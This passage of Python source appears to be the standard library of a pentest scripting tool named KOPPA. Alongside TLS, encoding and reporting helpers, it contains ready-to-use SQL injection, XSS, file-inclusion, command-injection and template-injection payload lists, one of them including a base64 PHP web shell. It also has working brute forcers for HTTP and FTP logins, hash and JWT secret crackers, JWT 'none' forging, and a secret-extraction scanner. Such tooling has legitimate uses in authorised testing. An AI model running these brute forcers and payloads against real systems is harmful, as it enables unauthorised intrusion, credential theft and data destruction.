        "get_cert":    lambda host, port=443: _get_cert(_v(host), int(_v(port))),
        "verify":      lambda host, port=443: _verify_cert(_v(host), int(_v(port))),
        "ciphers":     lambda host, port=443: _get_ciphers(_v(host), int(_v(port))),
        "expiry":      lambda host, port=443: _cert_expiry(_v(host), int(_v(port))),
        "fingerprint": lambda host, port=443: _cert_fp(_v(host), int(_v(port))),
        "issuer":      lambda host, port=443: _cert_issuer(_v(host), int(_v(port))),
        "subject":     lambda host, port=443: _cert_subject(_v(host), int(_v(port))),
        "supports_tls12": lambda host, port=443: _supports_protocol(_v(host), int(_v(port)), ssl.PROTOCOL_TLSv1_2),
        "is_expired":  lambda host, port=443: _is_cert_expired(_v(host), int(_v(port))),
        "san":         lambda host, port=443: _cert_san(_v(host), int(_v(port))),
        "hsts":        lambda host: _check_hsts(_v(host)),
    }

def _ssl_connect(host, port=443):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = socket.create_connection((host, port), timeout=5)
    return ctx.wrap_socket(s, server_hostname=host)

def _get_cert(host, port=443):
    try:
        conn = _ssl_connect(host, port)
        cert = conn.getpeercert()
        conn.close()
        return _rv(cert, "dict")
    except Exception as e: return _rv({"error": str(e)}, "dict")

def _verify_cert(host, port=443):
    try:
        ctx = ssl.create_default_context()
        s = socket.create_connection((host, port), timeout=5)
        ctx.wrap_socket(s, server_hostname=host)
        return _rv(True, "bool")
    except: return _rv(False, "bool")

def _get_ciphers(host, port=443):
    try:
        conn = _ssl_connect(host, port)
        cipher = conn.cipher()
        conn.close()
        return _rv({"name": cipher[0], "protocol": cipher[1], "bits": cipher[2]}, "dict")
    except Exception as e: return _rv({"error": str(e)}, "dict")

def _cert_expiry(host, port=443):
    try:
        conn = _ssl_connect(host, port)
        cert = conn.getpeercert()
        conn.close()
        exp = cert.get('notAfter', '')
        return _rv(exp, "string")
    except: return _rv("", "string")

def _cert_fp(host, port=443):
    try:
        conn = _ssl_connect(host, port)
        der = conn.getpeercert(binary_form=True)
        conn.close()
        return _rv(hashlib.sha256(der).hexdigest(), "string")
    except: return _rv("", "string")

def _cert_issuer(host, port=443):
    try:
        conn = _ssl_connect(host, port)
        cert = conn.getpeercert()
        conn.close()
        issuer = dict(x[0] for x in cert.get('issuer', []))
        return _rv(issuer.get('organizationName', ''), "string")
    except: return _rv("", "string")

def _cert_subject(host, port=443):
    try:
        conn = _ssl_connect(host, port)
        cert = conn.getpeercert()
        conn.close()
        subj = dict(x[0] for x in cert.get('subject', []))
        return _rv(subj.get('commonName', ''), "string")
    except: return _rv("", "string")

def _supports_protocol(host, port, protocol):
    try:
        ctx = ssl.SSLContext(protocol)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = socket.create_connection((host, port), timeout=5)
        ctx.wrap_socket(s, server_hostname=host)
        return _rv(True, "bool")
    except: return _rv(False, "bool")

def _is_cert_expired(host, port=443):
    try:
        conn = _ssl_connect(host, port)
        cert = conn.getpeercert()
        conn.close()
        exp_str = cert.get('notAfter', '')
        exp = datetime.datetime.strptime(exp_str, '%b %d %H:%M:%S %Y %Z')
        return _rv(exp < datetime.datetime.utcnow(), "bool")
    except: return _rv(False, "bool")

def _cert_san(host, port=443):
    try:
        conn = _ssl_connect(host, port)
        cert = conn.getpeercert()
        conn.close()
        sans = [v for t, v in cert.get('subjectAltName', []) if t == 'DNS']
        return _arr([_rv(s, "string") for s in sans])
    except: return _arr([])

def _check_hsts(host):
    try:
        req = urllib.request.Request(f"https://{host}", headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=5) as r:
            return _rv('strict-transport-security' in {k.lower(): v for k, v in r.headers.items()}, "bool")
    except: return _rv(False, "bool")


# ═══════════════════════════════════════════════════════════════════════
# SECURITY / PENTEST
# ═══════════════════════════════════════════════════════════════════════

def encode_module() -> Dict[str, Callable]:
    return {
        "b64_encode":   lambda s: _rv(base64.b64encode(_v(s).encode() if isinstance(_v(s), str) else _v(s)).decode(), "string"),
        "b64_decode":   lambda s: _rv(base64.b64decode(_v(s)).decode('utf-8', errors='ignore'), "string"),
        "b64url_encode":lambda s: _rv(base64.urlsafe_b64encode(_v(s).encode()).decode().rstrip('='), "string"),
        "b64url_decode":lambda s: _rv(base64.urlsafe_b64decode(_v(s) + '==').decode('utf-8', errors='ignore'), "string"),
        "hex_encode":   lambda s: _rv(_v(s).encode().hex() if isinstance(_v(s), str) else bytes(_v(s)).hex(), "string"),
        "hex_decode":   lambda s: _rv(bytes.fromhex(_v(s)).decode('utf-8', errors='ignore'), "string"),
        "url_encode":   lambda s: _rv(urllib.parse.quote(_v(s), safe=''), "string"),
        "url_decode":   lambda s: _rv(urllib.parse.unquote(_v(s)), "string"),
        "url_encode_all":lambda s: _rv(urllib.parse.quote(_v(s), safe=''), "string"),
        "html_encode":  lambda s: _rv(_v(s).replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'",'&#x27;'), "string"),
        "html_decode":  lambda s: _rv(_v(s).replace('&amp;','&').replace('&lt;','<').replace('&gt;','>').replace('&quot;','"').replace('&#x27;',"'"), "string"),
        "rot13":        lambda s: _rv(_v(s).translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz','NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')), "string"),
        "xor":          lambda s, key: _rv(''.join(chr(ord(c) ^ ord(_v(key)[i % len(_v(key))]) ) for i, c in enumerate(_v(s))), "string"),
        "binary":       lambda s: _rv(' '.join(format(ord(c), '08b') for c in _v(s)), "string"),
        "from_binary":  lambda s: _rv(''.join(chr(int(b, 2)) for b in _v(s).split()), "string"),
        "caesar":       lambda s, n=13: _rv(''.join(chr((ord(c) - (65 if c.isupper() else 97) + _v(n)) % 26 + (65 if c.isupper() else 97)) if c.isalpha() else c for c in _v(s)), "string"),
        "unicode_escape":lambda s: _rv(_v(s).encode('unicode_escape').decode(), "string"),
        "double_url":   lambda s: _rv(urllib.parse.quote(urllib.parse.quote(_v(s), safe=''), safe=''), "string"),
        "js_escape":    lambda s: _rv(_v(s).replace('\\','\\\\').replace("'","\\'").replace('"','\\"').replace('\n','\\n').replace('\r','\\r'), "string"),
        "sql_escape":   lambda s: _rv(_v(s).replace("'","''").replace('\\','\\\\'), "string"),
        "detect":       lambda s: _rv(_detect_encoding(_v(s)), "string"),
    }

def _detect_encoding(s):
    if re.match(r'^[A-Za-z0-9+/]+=*$', s) and len(s) % 4 == 0: return "base64"
    if re.match(r'^[0-9a-fA-F]+$', s) and len(s) % 2 == 0: return "hex"
    if re.match(r'^%[0-9a-fA-F]{2}', s): return "url_encoded"
    if '&lt;' in s or '&amp;' in s: return "html_encoded"
    if re.match(r'^[01 ]+$', s): return "binary"
    return "plain"


def hash_module() -> Dict[str, Callable]:
    return {
        "md5":      lambda s: _rv(hashlib.md5(_v(s).encode()).hexdigest(), "string"),
        "sha1":     lambda s: _rv(hashlib.sha1(_v(s).encode()).hexdigest(), "string"),
        "sha256":   lambda s: _rv(hashlib.sha256(_v(s).encode()).hexdigest(), "string"),
        "sha512":   lambda s: _rv(hashlib.sha512(_v(s).encode()).hexdigest(), "string"),
        "sha3_256": lambda s: _rv(hashlib.sha3_256(_v(s).encode()).hexdigest(), "string"),
        "sha3_512": lambda s: _rv(hashlib.sha3_512(_v(s).encode()).hexdigest(), "string"),
        "blake2b":  lambda s: _rv(hashlib.blake2b(_v(s).encode()).hexdigest(), "string"),
        "ntlm":     lambda s: _rv(hashlib.md5(_v(s).encode('utf-16le')).hexdigest(), "string"),
        "lm":       lambda s: _rv(_lm_hash(_v(s)), "string"),
        "hmac_sha256": lambda s, key: _rv(hmac.new(_v(key).encode(), _v(s).encode(), hashlib.sha256).hexdigest(), "string"),
        "hmac_sha512": lambda s, key: _rv(hmac.new(_v(key).encode(), _v(s).encode(), hashlib.sha512).hexdigest(), "string"),
        "identify": lambda h: _rv(_identify_hash(_v(h)), "string"),
        "compare":  lambda h1, h2: _rv(hmac.compare_digest(_v(h1), _v(h2)), "bool"),
        "crack":    lambda h, wordlist: _crack_hash(_v(h), _v(wordlist)),
        "file":     lambda p: _rv(_hash_file(_v(p)), "dict"),
    }

def _lm_hash(password):
    pwd = (password.upper() + '\x00' * 14)[:14].encode('latin-1')
    return hashlib.md5(pwd).hexdigest()

def _identify_hash(h):
    l = len(h)
    if l == 32: return "MD5 or NTLM"
    if l == 40: return "SHA1"
    if l == 64: return "SHA256 or SHA3-256"
    if l == 128: return "SHA512 or SHA3-512"
    return f"Unknown ({l} chars)"

def _crack_hash(h, wordlist):
    algs = [hashlib.md5, hashlib.sha1, hashlib.sha256, hashlib.sha512]
    words = wordlist if isinstance(wordlist, list) else str(wordlist).split('\n')
    for word in words:
        w = _v(word).strip()
        for alg in algs:
            if alg(w.encode()).hexdigest() == h:
                return _rv({"cracked": True, "password": w, "algorithm": alg().name}, "dict")
    return _rv({"cracked": False}, "dict")

def _hash_file(path):
    try:
        data = Path(path).read_bytes()
        return {"md5": hashlib.md5(data).hexdigest(), "sha1": hashlib.sha1(data).hexdigest(), "sha256": hashlib.sha256(data).hexdigest(), "size": len(data)}
    except Exception as e: return {"error": str(e)}


def jwt_module() -> Dict[str, Callable]:
    return {
        "decode":   lambda token: _jwt_decode(_v(token)),
        "header":   lambda token: _jwt_part(_v(token), 0),
        "payload":  lambda token: _jwt_part(_v(token), 1),
        "verify":   lambda token, secret: _jwt_verify(_v(token), _v(secret)),
        "none_alg": lambda token: _jwt_none(_v(token)),
        "crack":    lambda token, wordlist: _jwt_crack(_v(token), _v(wordlist)),
        "forge":    lambda payload, secret="": _jwt_forge(_v(payload), _v(secret)),
        "is_expired":lambda token: _jwt_expired(_v(token)),
        "kid_inject":lambda token, kid, secret: _rv(token, "string"),
    }

def _jwt_part(token, idx):
    try:
        parts = token.split('.')
        pad = parts[idx] + '=='
        return _rv(json.loads(base64.urlsafe_b64decode(pad)), "dict")
    except Exception as e: return _rv({"error": str(e)}, "dict")

def _jwt_decode(token):
    try:
        parts = token.split('.')
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
        return _rv({"header": header, "payload": payload, "signature": parts[2]}, "dict")
    except Exception as e: return _rv({"error": str(e)}, "dict")

def _jwt_verify(token, secret):
    try:
        parts = token.split('.')
        sig = hmac.new(secret.encode(), f"{parts[0]}.{parts[1]}".encode(), hashlib.sha256).digest()
        expected = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
        return _rv(hmac.compare_digest(parts[2], expected), "bool")
    except: return _rv(False, "bool")

def _jwt_none(token):
    try:
        parts = token.split('.')
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
        header['alg'] = 'none'
        new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
        return _rv(f"{new_header}.{parts[1]}.", "string")
    except Exception as e: return _rv(str(e), "string")

def _jwt_crack(token, wordlist):
    parts = token.split('.')
    msg = f"{parts[0]}.{parts[1]}"
    words = wordlist if isinstance(wordlist, list) else str(wordlist).split('\n')
    for word in words:
        w = _v(word).strip()
        sig = hmac.new(w.encode(), msg.encode(), hashlib.sha256).digest()
        expected = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
        if hmac.compare_digest(parts[2], expected):
            return _rv({"cracked": True, "secret": w}, "dict")
    return _rv({"cracked": False}, "dict")

def _jwt_forge(payload, secret=""):
    header = {"alg": "HS256" if _v(secret) else "none", "typ": "JWT"}
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
    p = base64.urlsafe_b64encode(json.dumps(_deep_v(payload)).encode()).rstrip(b'=').decode()
    if secret:
        sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
        s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
    else:
        s = ""
    return _rv(f"{h}.{p}.{s}", "string")

def _jwt_expired(token):
    try:
        payload = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '=='))
        exp = payload.get('exp', 0)
        return _rv(exp < _time.time(), "bool")
    except: return _rv(True, "bool")


def fuzz_module() -> Dict[str, Callable]:
    return {
        "dirs":     lambda url, wordlist, ext="": _fuzz_dirs(_v(url), _v(wordlist), _v(ext)),
        "params":   lambda url, wordlist: _fuzz_params(_v(url), _v(wordlist)),
        "headers":  lambda url, header, wordlist: _fuzz_header(_v(url), _v(header), _v(wordlist)),
        "vhosts":   lambda ip, wordlist, port=80: _fuzz_vhosts(_v(ip), _v(wordlist), int(_v(port))),
        "sqli_quick":lambda url, param: _fuzz_sqli(_v(url), _v(param)),
        "xss_quick": lambda url, param: _fuzz_xss(_v(url), _v(param)),
        "payloads_sqli": lambda: _arr([_rv(p, "string") for p in SQLI_PAYLOADS]),
        "payloads_xss":  lambda: _arr([_rv(p, "string") for p in XSS_PAYLOADS]),
        "payloads_lfi":  lambda: _arr([_rv(p, "string") for p in LFI_PAYLOADS]),
        "payloads_rce":  lambda: _arr([_rv(p, "string") for p in RCE_PAYLOADS]),
        "payloads_ssti": lambda: _arr([_rv(p, "string") for p in SSTI_PAYLOADS]),
    }

SQLI_PAYLOADS = ["'", "''", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "\" OR \"1\"=\"1", "1 OR 1=1", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--", "'; DROP TABLE users--", "1' AND SLEEP(5)--", "1 AND 1=2 UNION SELECT 1,2,3--", "' AND 1=CONVERT(int,@@version)--"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "javascript:alert(1)", "'><script>alert(1)</script>", "\"><script>alert(1)</script>", "<iframe src=javascript:alert(1)>", "';alert(1)//", "<body onload=alert(1)>", "{{7*7}}", "${7*7}", "<%=7*7%>", "<img src=1 onerror=alert`1`>", "<details open ontoggle=alert(1)>"]
LFI_PAYLOADS = ["../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd", "/etc/passwd", "/etc/shadow", "/etc/hosts", "....//....//etc/passwd", "..%2F..%2Fetc%2Fpasswd", "%2e%2e%2fetc%2fpasswd", "php://filter/convert.base64-encode/resource=index.php", "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="]
RCE_PAYLOADS = ["; ls", "| ls", "` ls `", "$(ls)", "; whoami", "| whoami", "&& whoami", "; cat /etc/passwd", "| cat /etc/passwd", "; id", "| id", ";ls${IFS}", "|ls${IFS}", "%0als", "%0awhoami"]
SSTI_PAYLOADS = ["{{7*7}}", "{{7*'7'}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}", "{{self}}", "{{''.__class__.__mro__}}", "${class.forName('java.lang.Runtime')}"]

def _fuzz_dirs(url, wordlist, ext=""):
    found = []
    url = url.rstrip('/')
    words = wordlist if isinstance(wordlist, list) else str(wordlist).split('\n')
    for word in words[:200]:
        w = _v(word).strip()
        if not w: continue
        target = f"{url}/{w}{ext}"
        try:
            req = urllib.request.Request(target, headers={"User-Agent": "KOPPA/2.0"})
            with urllib.request.urlopen(req, timeout=3) as r:
                if r.status < 404:
                    found.append(_rv({"url": target, "status": r.status}, "dict"))
        except urllib.error.HTTPError as e:
            if e.code < 404:
                found.append(_rv({"url": target, "status": e.code}, "dict"))
        except: pass
    return _arr(found)

def _fuzz_params(url, wordlist):
    found = []
    words = wordlist if isinstance(wordlist, list) else str(wordlist).split('\n')
    for word in words[:100]:
        w = _v(word).strip()
        if not w: continue
        target = f"{url}?{w}=FUZZ"
        try:
            req = urllib.request.Request(target, headers={"User-Agent": "KOPPA/2.0"})
            with urllib.request.urlopen(req, timeout=3) as r:
                body = r.read(4096).decode('utf-8', errors='ignore')
                if 'FUZZ' not in body:
                    found.append(_rv({"param": w, "url": target, "status": r.status}, "dict"))
        except: pass
    return _arr(found)

def _fuzz_header(url, header, wordlist):
    found = []
    words = wordlist if isinstance(wordlist, list) else str(wordlist).split('\n')
    for word in words[:100]:
        w = _v(word).strip()
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "KOPPA/2.0", _v(header): w})
            with urllib.request.urlopen(req, timeout=3) as r:
                found.append(_rv({"value": w, "status": r.status}, "dict"))
        except: pass
    return _arr(found)

def _fuzz_vhosts(ip, wordlist, port=80):
    found = []
    words = wordlist if isinstance(wordlist, list) else str(wordlist).split('\n')
    base_len = _get_base_len(ip, port)
    for word in words[:200]:
        w = _v(word).strip()
        if not w: continue
        try:
            req = urllib.request.Request(f"http://{ip}:{port}/", headers={"Host": w, "User-Agent": "KOPPA/2.0"})
            with urllib.request.urlopen(req, timeout=3) as r:
                body = r.read()
                if len(body) != base_len:
                    found.append(_rv({"vhost": w, "status": r.status, "size": len(body)}, "dict"))
        except: pass
    return _arr(found)

def _get_base_len(ip, port=80):
    try:
        req = urllib.request.Request(f"http://{ip}:{port}/", headers={"User-Agent": "KOPPA/2.0"})
        with urllib.request.urlopen(req, timeout=3) as r:
            return len(r.read())
    except: return 0

def _fuzz_sqli(url, param):
    found = []
    for payload in SQLI_PAYLOADS:
        target = f"{url}?{param}={urllib.parse.quote(payload)}"
        try:
            req = urllib.request.Request(target, headers={"User-Agent": "KOPPA/2.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read(8192).decode('utf-8', errors='ignore').lower()
                for sig in ["sql syntax", "mysql_fetch", "ora-", "unclosed quotation", "syntax error"]:
                    if sig in body:
                        found.append(_rv({"payload": payload, "signature": sig}, "dict"))
                        break
        except: pass
    return _arr(found)

def _fuzz_xss(url, param):
    found = []
    for payload in XSS_PAYLOADS[:8]:
        target = f"{url}?{param}={urllib.parse.quote(payload)}"
        try:
            req = urllib.request.Request(target, headers={"User-Agent": "KOPPA/2.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read(8192).decode('utf-8', errors='ignore')
                if payload in body:
                    found.append(_rv({"payload": payload, "reflected": True}, "dict"))
        except: pass
    return _arr(found)


def brute_module() -> Dict[str, Callable]:
    return {
        "http_basic":  lambda url, user_list, pass_list: _brute_http_basic(_v(url), _v(user_list), _v(pass_list)),
        "http_form":   lambda url, user_field, pass_field, user_list, pass_list, fail_str: _brute_http_form(_v(url), _v(user_field), _v(pass_field), _v(user_list), _v(pass_list), _v(fail_str)),
        "ftp":         lambda host, user_list, pass_list, port=21: _brute_ftp(_v(host), _v(user_list), _v(pass_list), int(_v(port))),
        "custom":      lambda fn, creds: _brute_custom(fn, _v(creds)),
        "combo_gen":   lambda users, passwords: _arr([_rv({"user": _v(u), "pass": _v(p)}, "dict") for u in _v(users) for p in _v(passwords)]),
        "mask_gen":    lambda mask: _arr([_rv(w, "string") for w in _mask_gen(_v(mask))]),
    }

def _brute_http_basic(url, user_list, pass_list):
    users = user_list if isinstance(user_list, list) else str(user_list).split('\n')
    passwords = pass_list if isinstance(pass_list, list) else str(pass_list).split('\n')
    for user in users[:50]:
        for pwd in passwords[:50]:
            u, p = _v(user).strip(), _v(pwd).strip()
            try:
                creds = base64.b64encode(f"{u}:{p}".encode()).decode()
                req = urllib.request.Request(url, headers={"Authorization": f"Basic {creds}", "User-Agent": "KOPPA/2.0"})
                with urllib.request.urlopen(req, timeout=5) as r:
                    if r.status == 200:
                        return _rv({"found": True, "user": u, "pass": p}, "dict")
            except urllib.error.HTTPError: pass
            except: pass
    return _rv({"found": False}, "dict")

def _brute_http_form(url, user_field, pass_field, user_list, pass_list, fail_str):
    users = user_list if isinstance(user_list, list) else str(user_list).split('\n')
    passwords = pass_list if isinstance(pass_list, list) else str(pass_list).split('\n')
    for user in users[:50]:
        for pwd in passwords[:50]:
            u, p = _v(user).strip(), _v(pwd).strip()
            try:
                data = urllib.parse.urlencode({user_field: u, pass_field: p}).encode()
                req = urllib.request.Request(url, data=data, headers={"User-Agent": "KOPPA/2.0", "Content-Type": "application/x-www-form-urlencoded"})
                with urllib.request.urlopen(req, timeout=5) as r:
                    body = r.read(4096).decode('utf-8', errors='ignore')
                    if fail_str not in body:
                        return _rv({"found": True, "user": u, "pass": p}, "dict")
            except: pass
    return _rv({"found": False}, "dict")

def _brute_ftp(host, user_list, pass_list, port=21):
    users = user_list if isinstance(user_list, list) else str(user_list).split('\n')
    passwords = pass_list if isinstance(pass_list, list) else str(pass_list).split('\n')
    for user in users[:30]:
        for pwd in passwords[:30]:
            u, p = _v(user).strip(), _v(pwd).strip()
            try:
                ftp = ftplib.FTP()
                ftp.connect(host, port, timeout=5)
                ftp.login(u, p)
                ftp.quit()
                return _rv({"found": True, "user": u, "pass": p}, "dict")
            except: pass
    return _rv({"found": False}, "dict")

def _brute_custom(fn, creds):
    for cred in creds:
        c = _v(cred)
        result = fn(c)
        if _v(result): return _rv({"found": True, "cred": c}, "dict")
    return _rv({"found": False}, "dict")

def _mask_gen(mask):
    import itertools
    charsets = {'d': string.digits, 'l': string.ascii_lowercase, 'u': string.ascii_uppercase, 'a': string.ascii_letters + string.digits, 's': string.punctuation, '?': '?'}
    parts = []
    for c in mask:
        parts.append(charsets.get(c, [c]))
    return [''.join(combo) for combo in itertools.product(*parts)]


def parse_module() -> Dict[str, Callable]:
    return {
        "html_links":   lambda html: _arr([_rv(u, "string") for u in re.findall(r'href=["\']([^"\']+)["\']', _v(html))]),
        "html_forms":   lambda html: _parse_forms(_v(html)),
        "html_inputs":  lambda html: _arr([_rv({"name": m.group(1) or "", "type": m.group(2) or "text", "value": m.group(3) or ""}, "dict") for m in re.finditer(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*type=["\']([^"\']*)["\'][^>]*(?:value=["\']([^"\']*)["\'])?', _v(html), re.I)]),
        "html_comments":lambda html: _arr([_rv(c, "string") for c in re.findall(r'<!--(.*?)-->', _v(html), re.DOTALL)]),
        "html_scripts": lambda html: _arr([_rv(s, "string") for s in re.findall(r'<script[^>]*>(.*?)</script>', _v(html), re.DOTALL | re.I)]),
        "html_meta":    lambda html: _parse_meta(_v(html)),
        "html_title":   lambda html: _rv(m.group(1) if (m := re.search(r'<title[^>]*>(.*?)</title>', _v(html), re.I | re.DOTALL)) else "", "string"),
        "html_text":    lambda html: _rv(re.sub(r'<[^>]+>', ' ', _v(html)), "string"),
        "extract_emails": lambda s: _arr([_rv(e, "string") for e in re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', _v(s))]),
        "extract_ips":  lambda s: _arr([_rv(ip, "string") for ip in re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', _v(s))]),
        "extract_urls": lambda s: _arr([_rv(u, "string") for u in re.findall(r'https?://[^\s"\'<>]+', _v(s))]),
        "extract_secrets": lambda s: _parse_secrets(_v(s)),
        "headers":      lambda raw: _parse_headers(_v(raw)),
        "cookies":      lambda raw: _parse_cookies(_v(raw)),
        "query_string": lambda qs: _rv(dict(urllib.parse.parse_qsl(_v(qs))), "dict"),
        "url_parts":    lambda url: _parse_url(_v(url)),
        "csv":          lambda s, delim=",": _arr([_arr([_rv(c, "string") for c in row.split(_v(delim))]) for row in _v(s).strip().split('\n')]),
    }

def _parse_forms(html):
    forms = []
    for form_match in re.finditer(r'<form([^>]*)>(.*?)</form>', html, re.DOTALL | re.I):
        attrs = dict(re.findall(r'(\w+)=["\']([^"\']*)["\']', form_match.group(1)))
        inputs = [{"name": m.group(1), "type": m.group(2) or "text"} for m in re.finditer(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:type=["\']([^"\']*)["\'])?', form_match.group(2), re.I)]
        forms.append(_rv({"action": attrs.get('action', ''), "method": attrs.get('method', 'GET').upper(), "inputs": inputs}, "dict"))
    return _arr(forms)

def _parse_meta(html):
    meta = {}
    for m in re.finditer(r'<meta\s+(?:name|property)=["\']([^"\']+)["\'][^>]*content=["\']([^"\']*)["\']', html, re.I):
        meta[m.group(1)] = m.group(2)
    return _rv(meta, "dict")

def _parse_secrets(s):
    patterns = {
        "aws_key": r'AKIA[0-9A-Z]{16}',
        "aws_secret": r'[0-9a-zA-Z/+]{40}',
        "api_key": r'(?:api[_-]?key|apikey)["\s:=]+["\']?([A-Za-z0-9\-_]{16,64})',
        "jwt": r'eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+',
        "private_key": r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
        "password": r'(?:password|passwd|pwd)["\s:=]+["\']?([^\s"\']{6,})',
        "github_token": r'gh[pousr]_[A-Za-z0-9]{36}',
        "stripe_key": r'sk_live_[A-Za-z0-9]{24}',
    }
    found = []
    for name, pattern in patterns.items():
        matches = re.findall(pattern, s, re.I)
        for m in matches:
            found.append(_rv({"type": name, "value": m if isinstance(m, str) else m}, "dict"))
    return _arr(found)

def _parse_headers(raw):
    headers = {}
    for line in raw.strip().split('\n'):
        if ':' in line:
            k, _, v = line.partition(':')
            headers[k.strip()] = v.strip()
    return _rv(headers, "dict")

def _parse_cookies(raw):
    cookies = {}
    for part in raw.split(';'):
        if '=' in part:
            k, _, v = part.partition('=')
            cookies[k.strip()] = v.strip()
    return _rv(cookies, "dict")

def _parse_url(url):
    p = urllib.parse.urlparse(url)
    return _rv({"scheme": p.scheme, "host": p.netloc, "path": p.path, "query": p.query, "fragment": p.fragment, "params": dict(urllib.parse.parse_qsl(p.query))}, "dict")


def report_module() -> Dict[str, Callable]:
    return {
        "finding":   lambda title, severity, desc: _rv({"title": _v(title), "severity": _v(severity), "description": _v(desc), "timestamp": str(datetime.datetime.now())}, "dict"),
        "html":      lambda findings, title="Pentest Report": _rv(_make_html_report(_v(findings), _v(title)), "string"),
        "markdown":  lambda findings, title="Pentest Report": _rv(_make_md_report(_v(findings), _v(title)), "string"),
        "json":      lambda findings: _rv(json.dumps([_v(f) for f in _v(findings)], indent=2, default=str), "string"),
        "csv":       lambda findings: _rv(_make_csv_report(_v(findings)), "string"),
        "save":      lambda findings, path, fmt="json": _save_report(_v(findings), _v(path), _v(fmt)),
        "summary":   lambda findings: _rv(_report_summary(_v(findings)), "dict"),
        "terminal":  lambda findings: _rv(_terminal_report(_v(findings)), "string"),
    }

def _sev_color(sev):
    return {"critical": "#ff0000", "high": "#ff6600", "medium": "#ffcc00", "low": "#00cc00", "info": "#0066ff"}.get(str(sev).lower(), "#888888")

def _make_html_report(findings, title):
    rows = ""
    for f in findings:
        fv = _v(f)
        if isinstance(fv, dict):
            sev = fv.get('severity', '')
            col = _sev_color(sev)
            rows += f"<tr><td>{fv.get('title','')}</td><td style='color:{col}'>{sev}</td><td>{fv.get('description','')}</td><td>{fv.get('timestamp','')}</td></tr>"
    css = "body{font-family:monospace;background:#0a0a12;color:#e0e0ff;padding:20px}table{width:100%;border-collapse:collapse}th,td{border:1px solid #333;padding:8px;text-align:left}th{background:#1a1a2e;color:#ffcc00}"
    return f"<!DOCTYPE html><html><head><title>{title}</title><style>{css}</style></head><body><h1 style='color:#00ffcc'>{title}</h1><p>Generated: {datetime.datetime.now()}</p><table><tr><th>Title</th><th>Severity</th><th>Description</th><th>Time</th></tr>{rows}</table></body></html>"

def _make_md_report(findings, title):
    lines = [f"# {title}", f"\nGenerated: {datetime.datetime.now()}\n", "| Title | Severity | Description |", "|-------|----------|-------------|"]
    for f in findings:
        fv = _v(f)
        if isinstance(fv, dict):
            lines.append(f"| {fv.get('title','')} | {fv.get('severity','')} | {fv.get('description','')} |")
    return '\n'.join(lines)

def _make_csv_report(findings):
    rows = ["title,severity,description,timestamp"]
    for f in findings:
        fv = _v(f)
        if isinstance(fv, dict):
            rows.append(f'"{fv.get("title","")}","{fv.get("severity","")}","{fv.get("description","")}","{fv.get("timestamp","")}"')
    return '\n'.join(rows)

def _save_report(findings, path, fmt="json"):
    if fmt == "html":
        content = _make_html_report(findings, "Report")
    elif fmt == "md":
        content = _make_md_report(findings, "Report")
    elif fmt == "csv":
        content = _make_csv_report(findings)
    else:
        content = json.dumps([_v(f) for f in findings], indent=2, default=str)
    Path(path).write_text(content, encoding='utf-8')
    return _rv(path, "string")

def _report_summary(findings):
    counts = {}
    for f in findings:
        fv = _v(f)
        if isinstance(fv, dict):
            sev = str(fv.get('severity', 'info')).lower()
            counts[sev] = counts.get(sev, 0) + 1
    return {"total": len(findings), "by_severity": counts}

def _terminal_report(findings):
    COLORS = {"critical": "\033[91m", "high": "\033[31m", "medium": "\033[33m", "low": "\033[32m", "info": "\033[34m"}
    lines = ["\033[1m\033[96m[KOPPA REPORT]\033[0m", "=" * 50]
    for f in findings:
        fv = _v(f)
        if isinstance(fv, dict):
            sev = str(fv.get('severity', 'info')).lower()
            col = COLORS.get(sev, "\033[0m")
            lines.append(f"{col}[{sev.upper()}]\033[0m {fv.get('title','')} — {fv.get('description','')}")
    lines.append("=" * 50)
    return '\n'.join(lines)


def smtp_module() -> Dict[str, Callable]:
    return {
        "connect":  lambda host, port=25, tls=False: _smtp_connect(_v(host), int(_v(port)), bool(_v(tls))),
        "send":     lambda host, port, user, pwd, to, subject, body: _smtp_send(_v(host), int(_v(port)), _v(user), _v(pwd), _v(to), _v(subject), _v(body)),
        "test":     lambda host, port=25: _smtp_test(_v(host), int(_v(port))),
        "banner":   lambda host, port=25: _rv(_smtp_banner(_v(host), int(_v(port))), "string"),
        "vrfy":     lambda host, port=25, user="root": _smtp_vrfy(_v(host), int(_v(port)), _v(user)),
        "expn":     lambda host, port=25, list="admin": _smtp_expn(_v(host), int(_v(port)), _v(list)),
    }

def _smtp_connect(host, port=25, tls=False):
